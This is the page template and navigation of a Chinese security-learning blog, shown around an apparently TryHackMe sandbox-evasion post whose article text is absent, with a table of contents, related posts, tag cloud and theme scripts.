fa-fw"></i> 2024-08-08</div><div class="title">THM-ByPass_UAC</div></div></a></div><div><a href="/2024/02/14/thm-basic-pentesting/" title="THM-Basic Pentesting"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-02-14</div><div class="title">THM-Basic Pentesting</div></div></a></div><div><a href="/2024/07/10/thm-c2-jian-jie/" title="THM-C2简介"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-07-10</div><div class="title">THM-C2简介</div></div></a></div><div><a href="/2024/06/17/thm-corp/" title="THM-Corp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-17</div><div class="title">THM-Corp</div></div></a></div><div><a href="/2024/06/09/thm-enumerating-active-directory/" title="THM-Enumerating Active Directory"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-09</div><div class="title">THM-Enumerating Active Directory</div></div></a></div><div><a href="/2024/07/16/thm-enumeration/" title="THM-Enumeration"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-07-16</div><div class="title">THM-Enumeration</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">hybcx</h1><div class="author-info__desc">只需热爱, 未来可期！</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hybchenxing" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/1761635300" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">0x01 介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0%E7%9B%AE%E6%A0%87"><span class="toc-number">1.1.</span> <span class="toc-text">学习目标</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%BF%E9%97%B4%E5%85%88%E5%86%B3%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.2.</span> <span class="toc-text">房间先决条件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E6%95%8C%E4%BA%BA%E9%99%B7%E5%85%A5-sandbox"><span class="toc-number">2.</span> <span class="toc-text">0x02 敌人陷入 Sandbox</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">什么是恶意软件分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E4%B8%8E%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90"><span class="toc-number">2.2.</span> <span class="toc-text">静态与动态分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B2%99%E7%9B%92%E7%AE%80%E4%BB%8B"><span class="toc-number">2.3.</span> <span class="toc-text">沙盒简介</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E5%B8%B8%E8%A7%81-sandbox-%E8%A7%84%E9%81%BF%E6%8A%80%E6%9C%AF"><span class="toc-number">3.</span> <span class="toc-text">0x03 常见 Sandbox 规避技术</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B2%99%E7%9B%92%E8%A7%84%E9%81%BF%E7%AE%80%E4%BB%8B"><span class="toc-number">3.1.</span> <span class="toc-text">沙盒规避简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sandbox%E7%9D%A1%E7%9C%A0"><span class="toc-number">3.2.</span> <span class="toc-text">Sandbox睡眠</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%B0%E7%90%86%E5%AE%9A%E4%BD%8D"><span class="toc-number">3.3.</span> <span class="toc-text">地理定位</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">3.4.</span> <span class="toc-text">查看系统信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF"><span class="toc-number">3.5.</span> <span class="toc-text">查询网络信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%90%AD%E5%BB%BA%E8%88%9E%E5%8F%B0"><span class="toc-number">3.6.</span> <span class="toc-text">搭建舞台</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E6%89%A7%E8%A1%8C%E5%90%84%E7%A7%8D%E8%A7%84%E9%81%BF%E6%8A%80%E6%9C%AF"><span class="toc-number">4.</span> <span class="toc-text">0x04 执行各种规避技术</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6%E6%B2%99%E7%9B%92%E8%A7%84%E9%81%BF"><span class="toc-number">4.1.</span> <span class="toc-text">深入研究沙盒规避</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#taking-a-nap"><span class="toc-number">4.2.</span> <span class="toc-text">Taking a Nap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%B0%E7%90%86%E4%BD%8D%E7%BD%AE%E8%BF%87%E6%BB%A4"><span class="toc-number">4.3.</span> <span class="toc-text">地理位置过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">4.4.</span> <span class="toc-text">查看系统信息</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AD%98"><span class="toc-number">4.4.1.</span> <span class="toc-text">检查系统内存</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF"><span class="toc-number">4.5.</span> <span class="toc-text">查询网络信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#visual-studio-%E4%B8%AD%E6%B7%BB%E5%8A%A0%E5%A4%96%E9%83%A8%E4%BE%9D%E8%B5%96%E9%A1%B9"><span class="toc-number">4.6.</span> <span class="toc-text">Visual Studio 中添加外部依赖项</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E5%AE%9E%E6%96%BD"><span class="toc-number">4.7.</span> <span class="toc-text">总结实施</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-diy-%E6%B2%99%E7%AE%B1%E8%A7%84%E9%81%BF%E6%8C%91%E6%88%98"><span class="toc-number">5.</span> <span class="toc-text">0x05 DIY 沙箱规避挑战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%A7%E9%80%83%E4%BA%A1"><span class="toc-number">5.1.</span> <span class="toc-text">大逃亡</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B2%99%E7%9B%92%E8%A7%84%E9%81%BF%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6"><span class="toc-number">5.2.</span> <span class="toc-text">沙盒规避二进制文件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-%E6%80%BB%E7%BB%93"><span class="toc-number">6.</span> <span class="toc-text">0x06 总结</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-sha-he-gui-bi/" title="THM-沙盒规避">THM-沙盒规避</a><time datetime="2024-08-21T09:41:49.000Z" title="发表于 2024-08-21 17:41:49">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-fang-huo-qiang/" title="THM-防火墙">THM-防火墙</a><time datetime="2024-08-21T07:07:33.000Z" title="发表于 2024-08-21 15:07:33">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-wang-luo-an-quan-jie-jue-fang-an/" title="THM-网络安全解决方案">THM-网络安全解决方案</a><time datetime="2024-08-21T01:37:19.000Z" title="发表于 2024-08-21 09:37:19">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-kao-tu-di-wei-sheng/" title="THM-靠土地为生">THM-靠土地为生</a><time datetime="2024-08-20T10:08:09.000Z" title="发表于 2024-08-20 18:08:09">2024-08-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-tao-bi-ri-zhi-ji-lu-he-jian-kong/" title="THM-逃避日志记录和监控">THM-逃避日志记录和监控</a><time datetime="2024-08-20T06:51:56.000Z" title="发表于 2024-08-20 14:51:56">2024-08-20</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="hybcx" target="_blank">hybcx</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">204</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">30</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 0.88rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 0.88rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 0.88rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 0.88rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 0.88rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 0.88rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 0.88rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.88rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hybcx 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="https://cdn.cbd.int/algoliasearch@4.18.0/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.cbd.int/instantsearch.js@4.60.0/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
      appKey: 'iEFJUGMm2FY91n9ZG1gdKBSy',
      avatar: 'mp',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getIcon = (icon, mail) => {
    if (icon) return icon
    let defaultIcon = '?d=mp'
